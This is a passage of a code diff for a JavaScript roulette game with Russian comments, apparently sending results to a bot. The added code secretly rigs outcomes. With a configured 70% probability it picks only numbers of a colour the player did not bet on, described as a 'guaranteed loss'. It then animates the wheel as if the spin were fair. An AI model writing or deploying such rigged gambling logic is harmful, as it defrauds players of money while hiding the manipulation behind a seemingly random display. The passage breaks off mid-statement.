@@ -153,18 +153,44 @@
     function startSpin(betType) {
         const amount = parseInt(document.getElementById('bet-amount').value);
         if (isNaN(amount) || amount <= 0) { alert('Введите сумму!'); return; }
-
+    
+        // Блокируем кнопки
         document.querySelectorAll('.bet-btn').forEach(b => b.disabled = true);
-
-        const targetIndex = Math.floor(Math.random() * 37) + (37 * 7); 
-        const winningNumber = totalCells[targetIndex];
-
+    
+        // НАСТРОЙКА КАЗИНО (0.3 = 30% шанс на честную игру, 70% — гарантированный слив)
+        const WIN_CHANCE = 0.3; 
+        let winningNumber;
+    
+        if (Math.random() > WIN_CHANCE) {
+            // --- РЕЖИМ ПОДКУРТКИ ---
+            // Фильтруем колесо рулетки и оставляем ТОЛЬКО те числа, которые принесут игроку проигрыш
+            let losingNumbers = order.filter(num => {
+                let color = 'black';
+                if (num === 0) color = 'zero';
+                else if (RED_NUMBERS.includes(num)) color = 'red';
+                
+                return color !== betType; // Оставляем только цвета, на которые юзер НЕ ставил
+            });
+    
+            // Выбираем случайное число из гарантированно проигрышных
+            winningNumber = losingNumbers[Math.floor(Math.random() * losingNumbers.length)];
+        } else {
+            // --- ЧЕСТНАЯ ИГРА ---
+            winningNumber = order[Math.floor(Math.random() * order.length)];
+        }
+    
+        // Находим индекс этого числа на 7-м круге нашей длинной ленты для красивой анимации
+        const targetIndex = order.indexOf(winningNumber) + (37 * 7); 
+    
+        // Считаем координаты для остановки ленты ровно по центру
         const containerWidth = document.querySelector('.roulette-container').offsetWidth;
         const targetX = -(targetIndex * cellWidth - containerWidth / 2 + cellWidth / 2);
-
+    
+        // Запуск вращения колеса (4 секунды)
         tape.style.transition = 'transform 4s cubic-bezier(0.1, 1, 0.1, 1)';
         tape.style.transform = `translateX(${targetX}px)`;
-
+    
+        // По окончании анимации отправляем результат боту
         setTimeout(() => {
             const betData = {
                 bet_amount: amount,
